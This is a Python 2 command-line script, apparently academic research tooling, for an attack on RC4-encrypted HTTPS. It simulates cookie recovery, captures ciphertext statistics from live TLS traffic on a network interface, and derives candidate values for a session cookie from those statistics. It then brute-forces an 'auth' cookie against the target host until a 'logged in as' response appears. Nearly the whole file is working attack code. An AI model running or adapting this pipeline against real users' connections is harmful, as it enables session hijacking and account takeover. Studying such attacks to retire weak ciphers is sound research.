#!/usr/bin/env python2
import sys, os
import stats, rc4decrypt, bruter
import netifaces as ni
import uuid, math

# Firefox 304, IE 310
COOKIEPOS   = 310

# Debug parameter/values
RSAKEY_FILE   = "../attacks/rc4https/ssl/server.key"
TESTCOOKIE    = "a156fa8e12c5943e"


def save_results(fname, options, firstcorrect, foundpos):
	fp = open("%s_%s.txt" % (fname, str(uuid.uuid4())), 'w')

	for key, value in options.items():
		print >>fp, "%s=%s" % (key, value)

	print >>fp, ""
	print >>fp, "foundpos=" + ",".join([str(pos) for pos in foundpos])
	print >>fp, "firstcorrect=" + ",".join([str(num) for num in firstcorrect])
			
	fp.close()


#### Simulation of attack by sampling multinomial distribution ####

def simulate_cookie(numsamples, numcandidates, cookiepos, absabmaxgap, charsetid):
	# Both options will sample from the multinomial distribution for speed:
	# 0: counts are sampled and immediately converted to likelihood estimates.
	# 1: all counts are sampled, and then likelihoods are calculated. Requires more
	#    memory, but better matches a real attack.
	simulate_counts = 0

	return rc4decrypt.simulate_cookie(None, numsamples, numcandidates, cookiepos, absabmaxgap, simulate_counts, charsetid)


def run_experiment():
	exponent      = 27
	cookiepos     = COOKIEPOS
	absabmaxgap   = 129
	charsetid     = 1
	# On Amazon AWS r3.8xlarge we can use 42502280 candidates for 95% memory usage
	# For a charset of 0 this becomes now 14605414 candidates
	numcandidates = 1

	maxfactor     = 128
	numruns       = 1

	for factor in range(1, maxfactor + 1):
		for j in range(numruns):
			results_cand    = []
			results_correct = [0] * 16
			for i in range(32):
				print "\n\t==== [%d/16 of %d/%d] %d/%d * 2^%d (charset %d) ====\n" % (i, j, numruns, factor,
					maxfactor, exponent, charsetid)
				poscorrect, poscand = simulate_cookie(factor * (2**exponent), numcandidates, cookiepos, absabmaxgap, charsetid)

				results_cand.append(poscand)
				for pos in range(16):
					results_correct[pos] += poscorrect[pos]

			fp = open('simulate_cookie_%dp%d_cand%d_cookiepos%d_maxgap%d_chars%d_%s.txt'
				% (factor, exponent, numcandidates, cookiepos, absabmaxgap, charsetid, str(uuid.uuid4())), 'w')

			print >>fp, "results_cand    =", results_cand
			print >>fp, "results_correct =", results_correct 
			print >>fp, ""
			print >>fp, "\n".join([str(pos) for pos in results_cand])
			print >>fp, ""
			print >>fp, "\t".join([str(num) for num in results_correct])

			fp.close()


#### Monitor a TLS/HTTPS connection and capture ciphertext statistics ####


# In the future this is an argument (for real MiTM positions).
def ownip(iface="eth0"):
	return ni.ifaddresses(iface)[2][0]['addr']


def monitor(iface="eth0", debug=False):
	import httpsmon

	cookielen     = 16
	cookiepos     = COOKIEPOS
	absabmaxgap   = 129
	serverips     = [ownip(iface)]
	clientips     = []
	verbose       = 0

	# Keep track of start time
	key = stats.KeyInfo()
	key.start()

	# Capture traffic
	if debug:
		counts, numrequests, offset = httpsmon.monitor_rc4cookie(iface, serverips, clientips, cookielen, cookiepos, absabmaxgap, verbose,
						RSAKEY_FILE, TESTCOOKIE)
	else:
		counts, numrequests, offset = httpsmon.monitor_rc4cookie(iface, serverips, clientips, cookielen, cookiepos, absabmaxgap, verbose)

	# Save the results (use a random AES key)
	key.finish(os.urandom(16), counts.shape, numrequests)
	options = {"cookiepos": cookiepos, "maxgap": absabmaxgap, "offset": offset}
	s = stats.Stats("httpsmon", "monitor", counts, options, set([key]))
	filename = s.write()
	print "Wrote captured stats to", filename


#### Processing a captured stats file using httpsmon ####

def crack_capture(fname, plainfile):
	# Get the known plaintext
	plaintext = open(plainfile).read()

	# Example stats generation: ./stats.py generate rc4decrypt simultlscookie 30 cookiepos=306 absabmaxgap=129
	s = stats.Stats().readfile(fname)
	count = s.count
	if count.dtype != "uint32":
		count = count.astype("uint32")

	# Default values correspond to previously hardcoded generation options
	offset      = int(s.options.get("offset", 72))
	cookiepos   = int(s.options.get("cookiepos", 306))
	absabmaxgap = int(s.options.get("maxgap", 128))

	numcandidates = 256 * 256 * 128
	chatsetid = 1
	print rc4decrypt.process_simultlscookie(count, offset, cookiepos, absabmaxgap, numcandidates, chatsetid, plaintext)

#### Processing a captured stats file and write possible cookies to file ####

def brute_candidates(fname, plainfile):
	# Get the known plaintext
	plaintext = open(plainfile).read()

	# Example stats generation: ./stats.py generate rc4decrypt simultlscookie 30 cookiepos=306 absabmaxgap=129
	s = stats.Stats().readfile(fname)
	count = s.count
	if count.dtype != "uint32":
		count = count.astype("uint32")

	# Default values correspond to previously hardcoded generation options
	offset      = int(s.options.get("offset"))
	cookiepos   = int(s.options.get("cookiepos"))
	absabmaxgap = int(s.options.get("maxgap"))

	# Generate the candadite list (and free the statistics one we have a list)
	numcandidates = 256 * 64
	chatsetid  = 1
	returnlist = 1
	candidates = rc4decrypt.process_simultlscookie(count, offset, cookiepos, absabmaxgap, numcandidates, chatsetid, plaintext, returnlist)
	del count
	del s

	with open("cookies.txt", "w") as fp:
		for candidate in candidates:
			fp.write(candidate + "\n")

	print("Wrote list of cookie candidates to cookies.txt!")

#### Processing a captured stats file and brute-force the cookie ####

def brute_capture(fname, plainfile):
	# Get the known plaintext
	plaintext = open(plainfile).read()

	# Example stats generation: ./stats.py generate rc4decrypt simultlscookie 30 cookiepos=306 absabmaxgap=129
	s = stats.Stats().readfile(fname)
	count = s.count
	if count.dtype != "uint32":
		count = count.astype("uint32")

	# Default values correspond to previously hardcoded generation options
	offset      = int(s.options.get("offset"))
	cookiepos   = int(s.options.get("cookiepos"))
	absabmaxgap = int(s.options.get("maxgap"))

	# Generate the candadite list (and free the statistics one we have a list)
	numcandidates = 256 * 64
	chatsetid  = 1
	returnlist = 1
	candidates = rc4decrypt.process_simultlscookie(count, offset, cookiepos, absabmaxgap, numcandidates, chatsetid, plaintext, returnlist)
	del count
	del s

	# Pass the generated candidates to the bruteforcer
	hosts      = filter(lambda h: h.lower().startswith("host: "), plaintext.split("\r\n"))
	cookiename = "auth"
	sentinel   = "logged in as"
	bruter.brutecookie(hosts[0][6:], cookiename, candidates, sentinel)


#### Process a list of stats files generated using simultlscookie ####

def process_stats(founddir, faildir, files):
	numcandidates = 256 * 256 * 128
	charsetid = 1

	for i in range(len(files)):
		fname = files[i]
		print ">> [%d/%d] Reading %s" % (i, len(files), fname)
		s         = stats.Stats().readfile(fname)
		offset    = int(s.options["offset"])
		cookiepos = int(s.options["cookiepos"])
		maxgap    = int(s.options["maxgap"])

		count = s.count
		if count.dtype != "uint32":
			count = count.astype("uint32")

		print ">> Processing", fname
		firstcorrect, foundpos = rc4decrypt.process_simultlscookie(count, offset, cookiepos, maxgap, numcandidates, charsetid)

		dest = os.path.join(founddir if foundpos >= 0 else faildir, fname)
		print ">> Moving file to", dest
		os.rename(fname, dest)

		options = s.options.copy()
		options["samples"] = s.numsamples()
		options["numcand"] = numcandidates
		options["charsetid"] = charsetid
		save_results("simultlscookie", options, firstcorrect, [foundpos])

		del s


#### Main function ####

def main():
	if len(sys.argv) < 2:
		print "Usage:", sys.argv[0], "simulate|monitor|crack|brute|process"
		quit(1)

	# Old simulation experiment used for submitted paper for review 
	if sys.argv[1] == "simulate":
		run_experiment()
	# Monitor TLS connection and 
	elif sys.argv[1] == "monitor":
		if len(sys.argv) < 3:
			print "Usage:", sys.argv[0], "monitor interface [debug]"
			quit(1)
		iface = sys.argv[2]
		debug = False
		if len(sys.argv) >= 4:
			if sys.argv[3] == "debug":
				debug = True
			else:
				print "Unknown option for monitor"
				quit(1)
		monitor(iface, debug)
	# Crack httpsmon capture of a real attack
	elif sys.argv[1] == "crack":
		if len(sys.argv) != 4:
			print "Usage:", sys.argv[0], "crack statsfile plaintext"
			quit(1)
		crack_capture(sys.argv[2], sys.argv[3])
	# Crack httpsmon capture and output list of cookie candidates to cookies.txt
	elif sys.argv[1] == "recover":
		if len(sys.argv) != 4:
			print "Usage:", sys.argv[0], "brute statsfile plaintext"
			quit(1)
		brute_candidates(sys.argv[2], sys.argv[3])
	# Crack httpsmon capture using a real brute-force approach
	elif sys.argv[1] == "brute":
		if len(sys.argv) != 4:
			print "Usage:", sys.argv[0], "brute statsfile plaintext"
			quit(1)
		brute_capture(sys.argv[2], sys.argv[3])
	# Process stats generated by simultlscookie
	elif sys.argv[1] == "process":
		if len(sys.argv) <= 3:
			print "Usage:", sys.argv[0], "founddir faildir file [file ...]"
			quit(1)
		founddir = sys.argv[2]
		faildir = sys.argv[3]
		if not os.path.isdir(founddir) or not os.path.isdir(faildir):
			print "First two argument must be existing directories: founddir and faildir"
			quit(1)
		process_stats(founddir, faildir, sys.argv[4:])
	else:
		print "Unknown command", sys.argv[1]
		quit(1)


if __name__ == "__main__":
	main()

